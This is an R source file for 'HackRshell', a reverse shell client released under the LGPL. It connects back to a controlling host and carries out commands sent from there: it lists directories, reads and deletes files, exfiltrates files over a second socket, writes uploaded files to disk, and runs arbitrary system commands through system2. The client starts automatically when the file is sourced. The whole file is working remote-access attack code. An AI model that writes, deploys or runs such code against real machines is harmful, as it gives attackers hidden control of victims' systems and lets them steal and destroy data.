    # HackRshell, an R reverse shell program - Client side function.
    # Copyright (C) 2022 Ian Roberts

    # This library is free software; you can redistribute it and/or
    # modify it under the terms of the GNU Lesser General Public
    # License as published by the Free Software Foundation; either
    # version 2.1 of the License, or (at your option) any later version.

    # This library is distributed in the hope that it will be useful,
    # but WITHOUT ANY WARRANTY; without even the implied warranty of
    # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
    # Lesser General Public License for more details.

    # You should have received a copy of the GNU Lesser General Public
    # License along with this library; if not, write to the Free Software
    # Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA

#Helper function, closes {con} without a warning message if
#connection is null, which is initially is in this program.
safeClose<- function(con) {
  if (!is.null(con)) {close(con)}
}



client <- function(host="localhost", port=4471, secondaryPort=5472) {
  socket <- socketConnection(host=host, port=port, server=FALSE, blocking=TRUE, encoding="utf-8", timeout=300, open="r+")

  #Ensures that the socket gets closed silently, even if program fails
  on.exit(tryCatch(close(socket), error=function(e){}, warning=function(w){}))

  exiting <- FALSE
  toServer <- "Connected"
  while(!exiting) {
#    print(toServer)
    writeLines(as.character(toServer), socket)
    rawCommand <- readLines(socket, 1)
    if (identical(rawCommand, character(0))) {
      command = c()
    } else {
      command <- strsplit(rawCommand, " ", fixed=TRUE)[[1]]
    }
    if (length(command) > 0 && !(identical(command[1], character(0)))) {

      if (command[1] == "exit") {
        exiting <- TRUE
      }

      else if (command[1] == "dir" || command[1] == "ls") {
        toServer <- paste(dir(all.files = TRUE), collapse="%&%")
      }

      else if (command[1] == "pwd") {
        toServer <- getwd()
      }

      else if (command[1] == "cd") {
        toServer <- tryCatch( {
          dirname <- substring(rawCommand, 4)
          if (!dir.exists(dirname)) {
            signalCondition(simpleError("That folder does not exist"))
          }
          setwd(dirname)
        }, error=function(e) {
          return(paste("Error: ", e$message))
        })
      }

      else if (command[1] == "del" || command[1] == "rm") {
        toServer <- tryCatch( {
          start <- nchar(command[1]) + 2
          fileName <- substring(rawCommand, start)
          file.remove(fileName)
          paste("Deleted", fileName)
        }, error=function(e) {
          paste("Error: ", e$message)
        }, warning=function(e){
          paste("Warning: ", w$message)
        })
      }

      else if (command[1] == "cat" || command[1] == "type") {
        start <- nchar(command[1]) + 2
        fileName <- substring(rawCommand, start)
        targetFile <- NULL
        toServer <- tryCatch( {
          targetFile <- file(fileName, "r", encoding="utf-8")
          paste(readLines(targetFile), collapse="%&%")
        }, error=function(e) {
          paste("Error: ", e$message)
        }, warning=function(w) {
          "This is not a text file"
        }, finally=function() {
          safeClose(targetFile)
        })
      }

      else if (command[1] == "download") {
        fileName <- substring(rawCommand, 10)
        abortDownload <- FALSE
        fileSize <- 0
        targetFile <- NULL
        fileData <- tryCatch({
          if (!file.exists(fileName)) {
            signalCondition(simpleError("File not found"))
          }
          fileInfo <- file.info(fileName, extra_cols=FALSE)
          fileSize <- as.integer(fileInfo$size)
          #Slight overestimate to compensate for floating point rounding error.
          #File size is saved as a float in file.info.
          if (fileInfo$isdir) {
            signalCondition(simpleError("That's a directory, this command can only download files."))
          }
          if (fileSize*1.01 >= 2^31) {
            signalCondition(simpleError("File too large to exfiltrate."))
          }
          targetFile <- file(fileName, "rb")
          readBin(targetFile, what="raw", n=fileSize*1.01)
        }, error=function(e){
          abortDownload <<- TRUE
          writeLines("-1", socket)
          paste("Error reading file: ", e$message)
        }, warning=function(w){
          abortDownload <<- TRUE
          paste("Warning: ", w$message)
        }, finally=function(){
          safeClose(targetFile)
        })
        exfilSocket <- NULL
        if (!abortDownload) {
          writeLines(toString(fileSize), socket)
          toServer <- tryCatch({
              exfilSocket <- socketConnection(host=host, port=secondaryPort, blocking=TRUE, server=FALSE, timeout=300, open="wb")
              writeBin(fileData, exfilSocket, size=1)
              "Download Complete!"
          }, error=function(e){
            paste("Client error transmitting file: ", e$message)
          }, warning=function(w){
            paste("Warning: ", w$message)
          }, finally=function(){
            safeClose(exfilSocket)
          })
        } else { #Error message
          toServer <- fileData
        }

      }

      else if (command[1] == "upload") {
        abortUpload <- FALSE
        fileSize <- as.integer(readLines(socket, 1))
        fileName <- substring(rawCommand, 8)
        uploadSocket <- NULL
        fileData <- tryCatch({
          if (fileSize < 0) {
            signalCondition(simpleError("Upload Aborted"))
          }
          uploadSocket <- socketConnection(host=host, port=secondaryPort, blocking=TRUE, server=FALSE, timeout=300, open="rb")
          readBin(uploadSocket, "raw", n=fileSize)
        }, error=function(e){
          abortUpload <<- TRUE
          paste("Error receiving data: ", e$message)
        }, warning=function(w){
          abortUpload <<- TRUE
          paste("Warning: ", w$message)
        }, finally=function(){
          safeClose(uploadSocket)
        })
        if(!abortUpload) {
          outFile <- NULL
          print("Executing If Statement")
          toServer <- tryCatch({
            outFile <- file(fileName, "wb")
            writeBin(as.raw(fileData), outFile, size=1)
            "File successfully written!"
          }, error=function(e){
            paste("Error writing received data: ", e$message)
          }, finally=function(){
            safeClose(outFile)
          })
        } else { #Error occurred
          toServer <- "Upload aborted by server"
        }
      }

      else if (command[1] == "sys") {
        toServer <- tryCatch({
          paste(system2(command[2], stdout=TRUE, args=command[-(1:2)]), collapse="%&%")
        }, error= function(e) {
          paste("Error: ", e$message)
        }, warning=function(w) {
          paste("Warning: ", w$message)
        })
      }

      else {
        toServer <- paste("Command ", command[1], " not recognized.", sep="'")
      }

    }
  }
  close(socket)
#  print("Socket closed")
}



client()
